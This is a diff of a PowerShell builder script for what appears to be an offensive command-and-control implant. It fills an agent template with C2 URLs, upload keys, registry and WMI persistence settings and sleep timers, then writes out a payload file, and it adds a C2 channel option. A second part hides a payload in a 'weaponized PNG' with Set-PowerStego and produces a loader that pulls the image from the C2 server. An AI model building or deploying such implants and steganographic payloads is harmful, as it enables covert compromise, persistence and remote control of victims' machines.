@@ -162,7 +162,7 @@ CleanComments -Path .\appdat.ps1 | set-content .\appdat.ps1
 #CleanComments -Path .\agent_pnt.ps1| set-content .\agent_pnt.ps1
 #CleanComments -Path .\appdat.ps1 | set-content .\appdat.ps1
 
-(get-content .\agent.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "UPGRADEPOWERSHELL", "$upgradepshell" -replace "ROOT_FOLDER", "$rootfolder" -replace "MYOPS", "$ops" -replace "SLPTM1", "$sleeptime1" -replace "SLPTM2", "$sleeptime2" -replace "SLPTM3", "$sleeptime3" -replace "ENDDATE", "$enddate" -replace "WORKSTART", "$workstart" -replace "WORKEND", "$workend" -replace "KEYUPLOAD", "$keyupload" -replace "KEYUPLOAD", "$keyupload2"  -replace "AUTOPERSIST", "$autopersist"  -replace "DEFAULTPERSIST", "$defaultpersist" -replace "REGKEY", "$regkey"  -replace "WMIKEY", "$wmikey"  -replace "MYENCODED", "$enc" } | set-content .\temp.ps1
+(get-content .\agent.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "UPGRADEPOWERSHELL", "$upgradepshell" -replace "ROOT_FOLDER", "$rootfolder" -replace "MYOPS", "$ops" -replace "SLPTM1", "$sleeptime1" -replace "SLPTM2", "$sleeptime2" -replace "SLPTM3", "$sleeptime3" -replace "ENDDATE", "$enddate" -replace "WORKSTART", "$workstart" -replace "WORKEND", "$workend" -replace "KEYUPLOAD", "$keyupload" -replace "KEYUPLOAD", "$keyupload2"  -replace "AUTOPERSIST", "$autopersist"  -replace "DEFAULTPERSIST", "$defaultpersist" -replace "REGKEY", "$regkey"  -replace "WMIKEY", "$wmikey"  -replace "MYENCODED", "$enc" -replace "C2CHANNEL", "$c2channel" } | set-content .\temp.ps1
 CleanComments -Path .\temp.ps1| set-content .\payload.ps1
 #get-content .\temp.ps1 | set-content .\payload.ps1
 set-content .\temp.ps1 -Value ""
@@ -582,7 +582,7 @@ Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath .\$evilimage -Ima
 Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/link/$evilimage -PayloadSource Text -PayloadPath .\png\InfectWithPNG.txt
 }
 Out-PNG
-Write-Host "Weaponized PNG file : RENAME-ME-evil.PNG"
+Write-Host "Weaponized PNG file : $evilimage"
 add-content ./stego.ps1 -Value "VAR_IMAGE_URL = Read-Host -Prompt 'Use your OWN URL. Type URL of Evil image : '" 
 add-content ./stego.ps1 -Value "Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath VAR_IMAGE_URL -PayloadSource Text -PayloadPath .\InfectWithPNG.txt"
 
